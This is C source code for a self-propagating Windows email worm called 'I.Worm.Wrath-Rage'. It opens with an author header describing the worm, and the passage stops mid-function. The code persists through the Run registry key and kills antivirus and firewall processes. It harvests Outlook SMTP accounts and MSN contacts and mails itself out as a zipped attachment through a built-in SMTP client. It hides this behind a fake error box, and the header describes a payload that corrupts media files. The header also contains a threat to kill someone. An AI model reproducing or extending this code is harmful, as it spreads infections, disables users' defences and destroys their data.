/*
I.Worm.Wrath-Rage

by jalo (drm~r)

My first worm!

In first place: Sorry for my english!!

Worm info:
----------

I.Worm.Wrath-Rage is one of multiple worm that at this moment exits in the wild Internet.
The damage that can make this worm is very little because the system of propagate is very
simple and it difficultes the infection of new computers. On the other hand, the damage
that the worm makes over the system, is minimium. In some dates, the worm actives the 
payload that will search files with extension ".mp3 , .part , .avi , etc" files, and fuck it
with the intention of that couldn't be used anymore.
Really, this fact, is part of payload, depends of the date, the worm, will show to user
some msgs, or try to block the computer, reset..

A interesting characteristic of the worm is that can received "command-line" parameters. This
parameters, determine the behavior of the worm. If no parameters given for example, the
worm try to copy it in hard disk and write the registry with the end of startup the worm
with Windows. Also tries to propagate with email system.

How work this shit?

Well, the basic funcionality of the worm was explained before.

In programm aspects, the worm uses functions of Win32 API in almost everything parts
of the worm.

The worm, uses some algorithms not coded by me, concretely, base64 encoding and decoding.
This algorithms were found in internet and molded to use in this worm.

One of the main characteristic is that the system used to compress the worm in Zip, is
i think some inusual (miser). I put a char * buffer that contains the Base64 code of pkzip
with the intention of encode it and create pkzip executable with the final intention of
create a .zip archive that contains the worm executable.

To send it by email, it uses winsock to create sockets, the worm integrates a mini smtp
client to send itself.

To obtains smtp servers with intention of propagate, the worms find in the registry
smtp server, email address, and display name of outlook settings.

If worm dont find any smtp server to propagate, he tries to use the default smtp servers
that i store in a array of the worm source. In this case, if dont have smtp servers, 
dont have email address, and dont have names to show. Then, the worm, generate a random
number with the intention of obtain and random email address and name to show (how remitent).

The body email, subjets, and name of attachments are ever related. This options, are
obtains from a random number also. If for example the body text are related with "sex",
the subject will be related also with "sex", and the file attachment name, equal.

To obtain people to send via email, we use messenger api to obtain contact list from msn user.

For more information about this worm, see the source code.

NOTE: It's possible that some commentaries of the source code are in spanish, it is,
because.. yeah!!! I'm spanish.

Disclaimer:
-----------

I.Worm.Wrath-Rage has been writed with educational purpouses. The author take no responsability
about the damage that will can do if other people compile and execute it.

Thanks to:
----------

- All the people in IRC (they know who are), that i ask continous questions about programming
or other things that i will use in this worm (and for other programs).

- Some of companions of my faculty that help me with some test and give me moral support.

- My family.

- My dog. (Cocky, i love u)

- A lot of more ...

Dedicated to..:
---------------

Only one comment..

Try don't see me. Try that i don't see you. Try.

Maybe, i will kill you.

*/

#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>
#include <tlhelp32.h>
#include <comutil.h>

#include "msgrua.h"
#include "msgruaid.h"
#include "project.h"

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd) {
	HWND window = CreateWindowEx(0,NULL,"Program",WS_OVERLAPPEDWINDOW | WS_HSCROLL | WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,(HWND) NULL,(HMENU) NULL, hInstance, NULL);    
	ShowWindow(window,SW_HIDE);
	UpdateWindow(window);
	if (strlen(lpCmdLine) == 0) {
		MessageBox(window,"This program has performed an illegal operation. Stack out of memory. Base reg found in 0xFFFUFFCFFKFFEFFD","Error running StackTrace",MB_OK+MB_ICONSTOP);
		defaultRun();
	}
	else {
		//if have args, -latent mode, try to execute payload.
		defaultRun();
		executePayload();
	}
}
void defaultRun() {
		startVariables(); //start
		createZipWithWorm(); //try to create Zip file with the worm
		//user infected
		obtainEmailsFromMSN6(); //obtain emails to send from msn 6 contact list
		copyMe(); //copy into the system
		killAVAndFirewallProcesses(); //kill process of av's and firewalls.
		disableAVSAndFirewalls(); //disable av's and firewalls windows startup
		putInRegistyToStartWithWindows(); //put worm into registry to load with windows.
		findEmailInfo(); //find smtp server, email, and name to send via email
		//c'est finih, para un usuario recien infectado
		if (sendMail() == FALSE) {
			//try to send via email.
			defaultPayload(); //fuck it!!
		} 
		//try to delete files created by the worm.
		DeleteFile(tmpFile); //borramos el .exe auxiliar
		DeleteFile(pkZipExeName); //borramos el pkzip
		if (windowsTempDirectory == NULL) {
			DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //borramos el zip
		}
		else {
			char *f1 = (char*)malloc(sizeof(char) * (strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + strlen(windowsTempDirectory) + 3));
			strcpy(f1,windowsTempDirectory);
			strcat(f1,"\\");
			strcat(f1,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
			DeleteFile(f1);
		}
}
/*
Function to start variables.
*/
void startVariables() {
	contadorServers = 0;
	currentAccount = (char*)malloc(sizeof(char) * strlen(FIRST_ACCOUNT));
	strcpy(currentAccount,FIRST_ACCOUNT);
	servidorActual = 0; //start with server 0
	posActualDestinatarios = 0; //destinatarios actual position = 0
	files.counter = 0; //actually, 0 files.
	char windowsDir[MAX_PATH];
	if (GetWindowsDirectory(windowsDir,MAX_PATH) != 0) {
		//if not fails
		windowsTempDirectory = (char*)malloc(sizeof(char) * strlen(windowsDir) + strlen("Temp") + 3);
		strcpy(windowsTempDirectory,windowsDir);
		strcat(windowsTempDirectory,"\\");
		strcat(windowsTempDirectory,"Temp");
		strcat(windowsTempDirectory,"\\");
	}
	else {
		//if fails, empty string.
		windowsTempDirectory = (char*)malloc(sizeof(char) * 2);
		strcpy(windowsTempDirectory,"");
	}

}
/*
Función to copy the worm.
*/
void copyMe() {
	char actualPath[MAX_PATH];
	char systemPath[MAX_PATH];
	unsigned char archProg[256]; //This contains: C:\Program Files\ or C:\Archivos de programa\ or ..
	DWORD archProgLength = sizeof(archProg);
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,WINDOWS_CURRENTVERSION,0,KEY_QUERY_VALUE,&hKey);
	RegQueryValueEx(hKey,PROGRAMFILESDIR,0,NULL,archProg,&archProgLength);
	RegCloseKey(hKey);
	if (GetModuleFileName(NULL,actualPath,MAX_PATH) != 0) {
		/* if obtain file correctly */
		char *newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
		GetSystemDirectory(systemPath,MAX_PATH);
		strcpy(newFile,systemPath); /* create destiny file */
		strcat(newFile,BARRA_INVERTIDA);
		strcat(newFile,EXE_NAME_TO_COPY);
		if (CopyFile(actualPath,newFile,FALSE) == 0) {
			//error copying to %SystemRoot%, try to %ProgramFilesDir%
			newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
			strcpy(newFile,(const char*)archProg);
			strcat(newFile,BARRA_INVERTIDA);
			strcat(newFile,EXE_NAME_TO_COPY);
			if (CopyFile(actualPath,newFile,FALSE) == 0) {
				whereIsStoredWorm = NULL; //can't infect windoze!
				//will execute the default payload :-)
			}
			else {
				//well copied
				whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
				strcpy(whereIsStoredWorm,newFile); //copy where is worm stored.
			}
		}
		else {
			//if copied well
			whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
			strcpy(whereIsStoredWorm,newFile); //copy where is worm stored.
		}
	}
}
/*
Function to connect to a server.
*/
int connect(char *server) {
	WSAStartup(MAKEWORD(1,1), &wsaData);
	LPHOSTENT mailServer = gethostbyname(server);
	if (!mailServer) {
		WSACleanup();
		return FALSE;
	}
	cSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (cSocket == INVALID_SOCKET) {
		WSACleanup();
		return FALSE;
	}
	serverInfo.sin_family = AF_INET;
	serverInfo.sin_addr = *((LPIN_ADDR)*mailServer->h_addr_list);
	serverInfo.sin_port = htons(25);
	nret = connect(cSocket,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
	if (nret == SOCKET_ERROR) {
		WSACleanup();
		return FALSE;
	}
	return TRUE;
}
/*
Function to send HELO.
*/
int sendHelo() {
	strcpy(bufferSend, HELO); //copy HELO
	strcat(bufferSend,smtpServers[servidorActual]); //put server
	strcat(bufferSend,CRNL); //put \r\n
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		return FALSE;
	}
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		return FALSE;
	}
	//if returns 250, ok
	return TRUE;
}
/*
Function to send to the socket MAIL FROM.
*/
int sendMailFrom(char *from) {
	strcpy(bufferSend, MAILFROM); //"MAIL FROM: <"
	strcat(bufferSend,from);
	strcat(bufferSend,MAYOR); //put >
	strcat(bufferSend,CRNL); // put \r\n
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		return FALSE;
	}
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		return FALSE;
	}
	//if returns 250, ok
	return TRUE;
}
/*
Function to send to the socket the recipients.
*/
int sendMailRcptTo() {
	int algunEmailValido = 0;
	int i = 0;
	while (destinatarios[i] != NULL) {
		strcpy(bufferSend, RCPTTO);//"RCPT TO: "
		strcat(bufferSend,destinatarios[i]);
		strcat(bufferSend,CRNL);
		if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
			return FALSE;
		}
		nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
		bufferRcvd[nret] = '\0';
		if (((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
			//if returns 250, ok
			algunEmailValido = 1; //one email valid minimium
		}
		i++;
	}
	if (algunEmailValido == 1) return TRUE; //if have valids emails..
	return FALSE; //if haven't valid emails, return false.
}
/*
Function to send to the socket DATA command.
*/
int sendData() {
	strcpy(bufferSend,DATA); //"DATA\r\n"
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		return FALSE;
	}
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	if (!((bufferRcvd[0] == '3') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '4'))) {
		return FALSE;
	}
	//if returns 354, ok
	return TRUE;
}
/*
Function to send to the socket mime commands.
*/
int sendMime(char email[],char name[]) {
	int i = 0;
	int aleatorio = rand() % MAX_MESSAGES; //random message
	for (i = 0; i < 26; i++) {
		char *aux;
		switch (i) {
			case 0:
				//modify FROM:
				//From: \"name\" <email@domain>\r\n
				aux = (char*)malloc(sizeof(char) * (strlen(email) + strlen(name) + strlen(smtpText[i]) + 8)); //8 = <,>,\0,\r,\n,",",espacio
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,name);
				strcat(aux,"\" ");
				strcat(aux,"<");
				strcat(aux,email);
				strcat(aux,">\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					return FALSE;
				}
				//modify from to put name and email
				break;
			case 2:
				//modify subject
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultSubjects[aleatorio]) + 1));
				strcpy(aux,smtpText[i]);
				strcat(aux,defaultSubjects[aleatorio]);
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					return FALSE;
				}
				break;
			case 18:
				//i = 18
				//message
				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
					return FALSE;
				}
				aux = (char*)malloc(sizeof(char) * (strlen(defaultEmailTexts[aleatorio]) + 1));
				strcpy(aux,defaultEmailTexts[aleatorio]);
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					return FALSE;
				}
				break;
			case 22: //file name
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,defaultFileNameAttachments[aleatorio]);
				strcat(aux,"\"");
				strcat(aux,"\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					return FALSE;
				}
				break;
			case 25: //file name
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,defaultFileNameAttachments[aleatorio]);
				strcat(aux,"\"");
				strcat(aux,"\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					return FALSE;
				}
				break;
			default:
				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
					return FALSE;
				}
		}
	}
	return TRUE;
}
/*
Función to send to the socket the file in base64.
*/
int sendBase64() {
	if (convertFileToBase64() == TRUE) {
		DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //delete zip
		DeleteFile(tmpFile); //delete auxiliar .exe
		DeleteFile(pkZipExeName); //delete pkzip
		if (send(cSocket,buffer64,(int)strlen(buffer64),0) == SOCKET_ERROR) {
			return FALSE;
		}
		return TRUE;
	}
	else {
		return FALSE;
	}
}
/*
Función to send CRNL (\r\n)
*/
int sendCRNL() {
	if (send(cSocket,CRNL,(int)strlen(CRNL),0) == SOCKET_ERROR) {
		return FALSE;
	}
	return TRUE;
}
/*
Function to connect SMTP server. The array parameter contains, server, email and name to show.
*/
int connectToSMTP(char *servEmailName[]) {
	if (connect(servEmailName[0]) == FALSE) {
		return FALSE;
	}
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '2') && (bufferRcvd[2] == '0'))) {
		//220 ok
		closesocket(cSocket);
		WSACleanup();
		return FALSE;
	}

	if (sendHelo() == FALSE) return FALSE; //send helo
	if (sendMailFrom(servEmailName[1]) == FALSE) return FALSE; //send Mail From:
	if (sendMailRcptTo() == FALSE) return FALSE; //send Rcpt to:
	if (sendData() == FALSE) return FALSE; //send Data
	if (sendMime(servEmailName[1],servEmailName[2]) == FALSE) return FALSE; //send mime
	if (sendCRNL() == FALSE) return FALSE; //send CRNL
	//if (sendCRNL() == FALSE) return FALSE; //send CRNL
	//if (sendCRNL() == FALSE) return FALSE; //send CRNL
	if (sendBase64() == FALSE) {
		return FALSE; //send buffer in base64
	}
	if (send(cSocket,smtpText[26],(int)strlen(smtpText[26]),0) == SOCKET_ERROR) return FALSE;
	if (send(cSocket,CR,(int)strlen(NEWLINE),0) == SOCKET_ERROR) return FALSE;
	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) return FALSE;
	if (send(cSocket,smtpText[27],(int)strlen(smtpText[27]),0) == SOCKET_ERROR) return FALSE;
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	//250 ok
	if (!((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		return FALSE;
	}
	if (send(cSocket,CR,(int)strlen(CR),0) == SOCKET_ERROR) {
		return FALSE;
	}
	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) {
		return FALSE;
	}
	if (send(cSocket,smtpText[28],(int)strlen(smtpText[28]),0) == SOCKET_ERROR) {
		return FALSE; //28 QUIT
	}
	nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	closesocket(cSocket);
	WSACleanup();
	return TRUE;
}
/*
Function to send via email.
*/
int sendMail() {
	int i = 0; //counter to view actual server of predefined
	int nResCon = 0; //variable to save that returns the conexion of server
	int seEnvioAlguno = FALSE; //variable to know if end email with registry server
	if (contadorServers > 0) {
		//if found servers in registry..
		do {
			int aleatorio = rand() % MAX_DEFAULT_EMAILS;
			//try to connect
			if (smtpServers[i] != NULL) {
				//if server != null, try to copy
				servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * strlen(smtpServers[i])); //memoria para el servidor
				strcpy(servidorEmailYNombreActual[0],smtpServers[i]); //copy the server
				if (emailAdresses[i] == NULL) {
					//if haven't email, i will take a random
					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(defaultRemitentes[aleatorio])); //memoria para el email
					strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]); //copy email
				}
				else {
					//if i have it, i will copy it
					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(emailAdresses[i])); //memoria para el email
					strcpy(servidorEmailYNombreActual[1],emailAdresses[i]); //copy email
				}
				if (nameToShowInEmails[i] == NULL) {
					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(defaultNames[aleatorio])); //memoria para el email
					strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
				}
				else {
					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(nameToShowInEmails[i])); //memoria para el email
					strcpy(servidorEmailYNombreActual[2],nameToShowInEmails[i]);
				}
				//have necesary info
				servidorActual = i; //actual smtp server is server 'i'
				nResCon = connectToSMTP(servidorEmailYNombreActual); //try to connect to the server
				if (nResCon == TRUE) return TRUE; //if send succesfully, return true and exit
			}
			nResCon = FALSE; 
			i++;
		}
		while ((nResCon == FALSE) && (i < contadorServers));
	}
	if (seEnvioAlguno == FALSE) {
		//if can't send with registry servers.. try with predefined
		//this if can be omited
		i = 0;
		do {
			int aleatorio = rand() % MAX_DEFAULT_EMAILS; //random mail 
			//the problem is that our structure of connectToSMTP()
			//it receives a parms that to registry servers was optimus
			//but here not. if registry dont work, we have to try with random servers
			//and random remitents and names 
			servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * (strlen(defaultSMTPServers[i]) + 1));
			strcpy(servidorEmailYNombreActual[0],defaultSMTPServers[i]);
			servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * (strlen(defaultRemitentes[aleatorio]) + 1));
			strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]);
			servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * (strlen(defaultNames[aleatorio]) + 1));
			strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
			nResCon = connectToSMTP(servidorEmailYNombreActual);
			if (nResCon == TRUE) return TRUE;
			i++;
		}
		while ((nResCon == FALSE) && (defaultSMTPServers[i] != NULL));
	}
	return FALSE; //can't send worm
}

/*
Function to obtain the size of a file.
*/
int getFileSize(char *file) {
	FILE *f = fopen(file,"rb");
	if (f == NULL) {
		return FALSE;
	}
	fseek (f , 0 , SEEK_END);
	return ftell (f);
}
/*
Function to convert Zip file that contains the worm.
*/
int convertFileToBase64() {
	int resEncode = 0;
	int size = getFileSize(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
	if (size == FALSE) {
		buffer64 = (char*)malloc(sizeof(char) * DEF_BASE64_SIZE);
	}
	else {
		buffer64 = (char*)malloc(sizeof(char) * (size * 2));
	}
	if (windowsTempDirectory == NULL) {
		resEncode = encode(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
	}
	else {
		char *f = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 3));
		strcpy(f,windowsTempDirectory);
		strcat(f,"\\");
		strcat(f,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
		resEncode = encode(f);
	}
	if (resEncode == FALSE) {
		return FALSE;
	}
	return TRUE;
}
/*
findEmailInfo():

This function open the registry with the porpouse of find keys stored in "Software\\Microsoft\\Internet Account Manager\\Accounts\\000000X"
Even of this keys contains information about the posible accounts of email logdget in the PC (Outlook), we will use this
accounts (smtp server, email, and name to show), to resend the worm.

The operation is easy, the worm will cros the keys (from 00000001 to 0000000X) finding info and compiling it.

For this, i will use function existsAccountsToGetMailInfo(), that return true if actual account exists.

If returns true, we will obtain smtp server, email, and name to show of accout, and we will store in smtpServers, emailAddresses, and nameToShowInEmails variables.

The operation of this variables are the next:

smtpServers[i] relation the server with emailAddresses[i] and nameToShowInEmails[i].

*/
void findEmailInfo() { 
	unsigned char smtp[256];
	unsigned char email[256];
	unsigned char name[256];
	DWORD smtpLength = sizeof(smtp);
	DWORD emailLength = sizeof(email);
	DWORD nameLength = sizeof(name);
	HKEY hKey;
	while (existsAccountsToGetMailInfo()) {
		char *actualSubKey = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
		strcpy(actualSubKey,REG_SUBKEY);
		char *temp = (char*)malloc(sizeof(char) * DEFAULT_SIZE_OF_ACCOUNTS_IDS);
		strcat(actualSubKey,currentAccount); 
		RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
		RegQueryValueEx(hKey,REG_SMTP_SERVER,0,NULL,smtp,&smtpLength);
		RegCloseKey(hKey);
		if (contadorServers < (MAX_NUMBER_OF_SERVERS - 1)) {
			if ((smtp[0] > 44) && (smtp[0] < 123)) {
				smtpServers[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(smtp));
				char *aux = (char*)malloc(sizeof(char) * obtainLength(smtp));
				memcpy(aux,smtp,obtainLength(smtp));
				aux[obtainLength(smtp)] = '\0';
				strcpy(smtpServers[contadorServers],aux);
			}
			RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
			RegQueryValueEx(hKey,REG_EMAIL_ACC,0,NULL,email,&emailLength);
			RegCloseKey(hKey);
			if ((email[0] > 44) && (email[0] < 123)) {
				emailAdresses[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(email));
				char *aux = (char*)malloc(sizeof(char) * obtainLength(email));
				memcpy(aux,email,obtainLength(email));
				aux[obtainLength(email)] = '\0';
				strcpy(emailAdresses[contadorServers],aux);
			}
			RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
			RegQueryValueEx(hKey,REG_EMAIL_NAME_TO_SHOW,0,NULL,name,&nameLength);
			RegCloseKey(hKey);
			nameToShowInEmails[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(name));
			char *aux = (char*)malloc(sizeof(char) * obtainLength(name));
			memcpy(aux,name,obtainLength(name));
			aux[obtainLength(name)] = '\0';
			strcpy(nameToShowInEmails[contadorServers],aux);
			contadorServers++; 
		}
		goToNextEmailAccount(); 
	}
}
/*
Function to obtain the size of a string in a char []
*/
int obtainLength(unsigned char b[]) {
	int i = 0;
	while (b[i] != NULL) {
		i++;
	}
	return i;
}
/*
Function to know if even exists accounts (really, to know if actual is valid) that check.
The function make use of return of RegOpenKeyEx(), depends od the vallue of currentAccount("00000001,00000002,..,0000000X")
If value is correct, this seems that its good.
*/
int existsAccountsToGetMailInfo() {
	HKEY key = NULL;
	char *aux = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
	strcpy(aux,REG_SUBKEY);
	strcat(aux,currentAccount);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,aux,0,KEY_QUERY_VALUE,&key) == 0) {
		return 1;
	}
	return 0;
}
/*
Function to increment the number account.
0000001
to
0000002
and to
0000003
etc.
*/
void goToNextEmailAccount() {
	int num = atoi(currentAccount);
	num++;
	sprintf(currentAccount, "%08d", num);
}
/*
Function to disable AV's and firewalls.
*/
void disableAVSAndFirewalls() {
	HKEY key;
	int i = 0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
		while (regsAVsAndFirewalls[i] != NULL) {
			RegDeleteValue(key,regsAVsAndFirewalls[i]);
			i++;
		}
	}
	RegCloseKey(key);
	i = 0;
	if (RegOpenKeyEx(HKEY_CURRENT_USER,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
		while (regsAVsAndFirewalls[i] != NULL) {
			RegDeleteValue(key,regsAVsAndFirewalls[i]);
			i++;
		}
	}
	RegCloseKey(key);
}
/*
Function to add worm to windows registry.
*/
void putInRegistyToStartWithWindows() {
	char actualPath[MAX_PATH];
	char systemPath[MAX_PATH];
	unsigned char file[256];
	HKEY key;
	char *newFile = (char*)malloc(sizeof(char) * (strlen(actualPath) + strlen(BARRA_INVERTIDA) + strlen(EXE_NAME) + 1));
	GetSystemDirectory(systemPath,MAX_PATH);
	strcpy(newFile,systemPath);
	strcat(newFile,BARRA_INVERTIDA);
	strcat(newFile,EXE_NAME);
	memcpy(file,newFile,strlen(newFile));
	file[strlen(newFile)] = '\0';
	if (RegCreateKey(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,&key) == 0) {
		RegSetValueEx(key,REG_WINAV,0,REG_SZ,file,sizeof(file));
	}
	RegCloseKey(key);
}
/*
Function to convert PKZIP (content in a buffer) in an executable file to use later.
*/
void convertPKZipBufferToExeFile() {
	int r1 = rand();
	int r2 = rand();
	char rS1[6];
	char rS2[6];
	char *fToCreate = NULL;
	sprintf(rS1,"%d",r1);
	sprintf(rS2,"%d",r2);
	fToCreate = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(PKZIP) + strlen(rS1) + strlen(rS2) + 6)); //5 = \0,.$wr$
	strcpy(fToCreate,windowsTempDirectory);
	strcat(fToCreate,PKZIP);
	strcat(fToCreate,rS1);
	strcat(fToCreate,rS2);
	strcat(fToCreate,".$wr$");
	FILE *f = fopen(fToCreate,"w");
	int i = 0;
	while (pkzip[i] != NULL) {
		fwrite(pkzip[i],1,strlen(pkzip[i]),f);
		i++;
	}
	fclose(f);
	decode(fToCreate);
	DeleteFile(fToCreate);
}
/*
Function to create the zip file that will contain the worm.
*/
void createZipWithWorm() {
	int r = rand() % MAX_NAMES_EXE;
	convertPKZipBufferToExeFile();
	//to check that create it correctly we try to open it.
	OFSTRUCT str;
	if (OpenFile(pkZipExeName, &str,OF_EXIST) != HFILE_ERROR) {
		char actualFile[MAX_PATH];
		//if pkzip executable exists..
		HWND hwnd = NULL;
		GetModuleFileName(NULL,actualFile,MAX_PATH);
		//parameters: destino.zip nombrewormexe.exe
		//the problem that have pkzip is that create an zip file with the name of the exe.
		//into, and we like that executable name into the zip have the a concret name.
		//for example , if we send a patch to internet explorer, we want that the executable or the zip contains this name
		//to obtain this, we will create and exe file with the attachment name, and it will be the file that we will zip.
		char *nAtt = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(namesExesInZip[r]) + 1 ));
		strcpy(nAtt,windowsTempDirectory);
		strcat(nAtt,namesExesInZip[r]);
		CopyFile(actualFile,nAtt,FALSE); //creamos el file nAttachment
		char *destino = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 1));
		strcpy(destino,windowsTempDirectory);
		strcat(destino,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
		char *parametros = (char*)malloc(sizeof(char) * (strlen(nAtt) + strlen(destino) + 3));//3 = \0, , ,
		strcpy(parametros,destino);
		strcat(parametros," ");
		strcat(parametros,nAtt); 
		ShellExecute(hwnd,"open",pkZipExeName,parametros,NULL,SW_HIDE);
		tmpFile = (char*)malloc(sizeof(char) * (strlen(nAtt) + 1));
		strcpy(tmpFile,nAtt);
	}
}
/*
Function to try to kill av's and firewall processes.
*/
void killAVAndFirewallProcesses() {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE ) {
		return;
	}
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	if( !Process32First( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return;
	}
	do
	{
		int i = 0;
		while (processAVsAndFirewalls[i] != NULL) {
			char *res1,*res2,*res3,*res4 = NULL;
			res1 = strstr(pe32.szExeFile,"av"); /* try to search if substring "av" is in actual process */
			res2 = strstr(pe32.szExeFile,"AV");
			res3 = strstr(pe32.szExeFile,"aV");
			res4 = strstr(pe32.szExeFile,"Av");
			if ((strcmp(pe32.szExeFile,processAVsAndFirewalls[i]) == 0) || (res1 != NULL) || (res2 != NULL) || (res3 != NULL) ||(res4 != NULL)) {
				TerminateProcess(hProcess,0);
			}
			i++;
		}
		dwPriorityClass = 0;
		hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID );
		dwPriorityClass = GetPriorityClass( hProcess );
		if( !dwPriorityClass ) CloseHandle( hProcess );
	} 
	while( Process32Next( hProcessSnap, &pe32 ) );
	CloseHandle( hProcessSnap );
}
/*
Function to obtain emails From MSN 6.
*/
void obtainEmailsFromMSN6() {
	long pCount;
	BSTR email;
	IMessengerContacts *pIMessengerContacts = NULL;
	IMessengerContact *pIMessengerContact = NULL;
	IDispatch *pIDispatch = NULL;
	IDispatch *ppMContact = NULL;
	IMessenger *pIMessenger = NULL; //a pointer to an IMessenger interface
	CoInitialize(0);
	if (SUCCEEDED(CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger))) {
		pIMessenger->get_MyContacts(&pIDispatch);
		pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
		pIDispatch->Release();
		pIMessengerContacts->get_Count(&pCount);
		for (int i = 0; i < pCount; i++) {
			if (pIMessengerContacts->Item(i,&pIDispatch) == S_OK) {
				if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
